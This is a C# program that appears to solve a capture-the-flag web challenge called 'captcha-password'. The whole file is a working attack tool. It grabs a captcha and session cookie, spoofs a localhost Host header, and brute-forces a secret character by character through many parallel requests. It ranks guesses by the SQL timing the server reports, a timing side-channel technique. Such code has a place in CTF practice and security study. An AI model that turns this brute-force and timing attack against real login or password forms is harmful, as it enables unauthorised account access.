using System;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Drawing;
using System.IO;
using System.Diagnostics;
using System.Text.RegularExpressions;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Threading;

namespace KiwiCaptchaPwd
{

#pragma warning disable CS1998

    class Program
    {
        static string url = "http://d0a744.hack.dat.kiwi/web/captcha-password/";
        static Regex rg = new Regex("Time: (\\d+.\\d+) seconds \\((\\d+.\\d+) PHP, (\\d+.\\d+) SQL\\)");
        static readonly ConcurrentDictionary<string, double> times = new ConcurrentDictionary<string, double>();
        static string captcha, cookie;
        static bool _bruteForce = true;

        static async void checkRange(int start, int count, string cn = null)
        {
            for (int i = start; i < start + count; i++)
            {
                string o = cn + Encoding.ASCII.GetString(new byte[] { (byte)i });

                Parallel.For(32, 128, new ParallelOptions() { MaxDegreeOfParallelism = 10 },
                    j => CheckInput(o + Encoding.ASCII.GetString(new byte[] { (byte)j })));

            }
        }

        static void Main(string[] args)
        {
            ServicePointManager.DefaultConnectionLimit = 0x50;

            var c = (HttpWebRequest)WebRequest.Create(url + "captcha.php");
            c.CookieContainer = new CookieContainer();
            var r = (HttpWebResponse)c.GetResponse();
            Console.WriteLine(r.Cookies["phpsessid"].ToString());
            var tmp = Path.GetTempFileName() + ".jpg";
            Image.FromStream(stream: r.GetResponseStream()).Save(tmp);
            Process.Start(tmp);
            Console.Write("Captcha: ");
            captcha = Console.ReadLine().ToUpper();
            cookie = r.Cookies[0].ToString();
            File.Delete(tmp);
            Console.Beep();

            if (_bruteForce)
            {
                var cnT = new Timer((e) => Console.WriteLine("================\nProgress: {0}% (Got {1})\n================",
                                                                times.Count / (double)(19 * 0x5 * 95) * 100, times.Count), null, 0, 10000);
                Parallel.For(0, 20, new ParallelOptions() { MaxDegreeOfParallelism = 50 },
                    i => checkRange(0x20 + i * 0x5, 0x5));
                cnT.Dispose();
            }
            else
            {
                for (int i = 32; i < 128; i++)
                {
                    string o = Encoding.ASCII.GetString(new byte[] { (byte)i });
                    CheckInput(o);

                    Thread.Sleep(500);
                }
            }

            var l = times.Values.ToList();
            l.Sort();

            for (int i = times.Keys.Count - 1; i > times.Keys.Count - 10; i--)
            {
                Console.WriteLine(l[i] + " : " + times.FirstOrDefault(x => x.Value == l[i]));
            }

            Console.Beep();
            StringBuilder sb = new StringBuilder();
            foreach (var t in times)
            {
                sb.AppendLine(t.Key + ", " + t.Value);
            }
            var p = Path.GetTempFileName();
            File.WriteAllText(p, sb.ToString());
            Process.Start(p);

            Console.Beep();
            Console.Beep();

            var canD = times.Where(x => x.Value > 0.8).ToDictionary(x => x.Key, x => x.Value);
            var canE = new Dictionary<string, double>();
            foreach (var d in canD)
            {
                canE.Add(d.Key, CheckInput(d.Key));
                Console.WriteLine("Retried {0}, Delta: {1}", d.Key, (times[d.Key] - canE[d.Key]));
                Thread.Sleep(1000);
            }

            while (true)
            {
                Console.Write("Enter input:");
                CheckInput(Console.ReadLine());
            }


        }
        static double CheckInput(string input)
        {
            try
            {
                var d = new WebClient();
                d.Headers.Add("host:localhost");
                d.Headers.Add("Content-Type: application/x-www-form-urlencoded");
                d.Headers.Add(HttpRequestHeader.Cookie, cookie);
                var cont = $"secret={input}&captcha={captcha}";
                var res = d.UploadString(url, cont);
                var m = rg.Match(res);
                Debug.WriteLine("{0},{1},{2},{3}", input, m.Groups[1].Value, m.Groups[2].Value, m.Groups[3].Value);
                var t = (double.Parse(m.Groups[3].Value));

                times.GetOrAdd(input, t);
                Console.WriteLine("Checked " + input + " with ~" + t + " sec average");
                return t;
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error @ {0} ! {1}", input, ex.Message);
                CheckInput(input);
            }

            // We won't reach this !
            return 0;
        }
    }
}
